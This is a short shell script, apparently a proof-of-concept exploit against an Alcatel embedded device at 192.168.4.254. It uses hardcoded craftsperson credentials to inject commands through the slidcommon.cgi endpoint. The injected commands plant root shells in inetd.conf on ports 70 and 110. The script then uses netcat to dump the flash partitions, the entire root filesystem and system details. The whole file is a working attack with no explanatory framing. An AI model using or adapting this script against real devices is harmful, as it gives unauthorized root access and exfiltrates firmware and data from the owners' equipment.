#!/bin/sh

echo -n "adding an exec shell for /tmp/execme.sh on 192.168.4.254:70 ... "
curl -s --data 'CMD=`echo gopher stream tcp nowait root /usr/sbin/tcpd /bin/sh /tmp/execme.sh >>/etc/inetd.conf`' 'http://CRAFTSPERSON:ALC#FGU@192.168.4.254/cgi-bin/slidcommon.cgi' >/dev/null
echo "done"
echo -n "adding a shell on 192.168.4.254:110 ... "
curl -s --data 'CMD=`echo pop3 stream tcp nowait root /usr/sbin/tcpd /bin/sh>>/etc/inetd.conf`' 'http://CRAFTSPERSON:ALC#FGU@192.168.4.254/cgi-bin/slidcommon.cgi' >/dev/null
echo "done"
echo -n "launching inetd ... "
curl -s --data 'CMD=inetd' 'http://CRAFTSPERSON:ALC#FGU@192.168.4.254/cgi-bin/slidcommon.cgi' >/dev/null
echo "done"


echo -n "dumping /dev/mtdblock/1 ... "
echo 'echo cat /dev/mtdblock/1 > /tmp/execme.sh;exit' | nc 192.168.4.254 110
nc 192.168.4.254 70 > dev-mtdblock-1
echo "done"

echo -n "dumping /dev/mtdblock/2 ... "
echo 'echo cat /dev/mtdblock/2 > /tmp/execme.sh;exit' | nc 192.168.4.254 110
nc 192.168.4.254 70 > dev-mtdblock-2
echo "done"

echo -n "dumping /dev/mtdblock/3 ... "
echo 'echo cat /dev/mtdblock/3 > /tmp/execme.sh;exit' | nc 192.168.4.254 110
nc 192.168.4.254 70 > dev-mtdblock-3
echo "done"

echo -n "tar cf / ... "
echo 'echo "tar cf - / 2>/dev/null" > /tmp/execme.sh;exit' | nc 192.168.4.254 110
nc 192.168.4.254 70 > root.fs.tar
echo "done"

echo -n "dumping informations ... "
echo "uname -ap ; cat /proc/cpuinfo ; cat /proc/meminfo ; ifconfig ; ps -auxww ; df -h ; lsmod ; dmesg ; /usr/alcatel/bin/retrieve-slid ; /usr/alcatel/dbg_bin/send help ; exit" | nc 192.168.4.254 110 > infos.txt
echo "done"
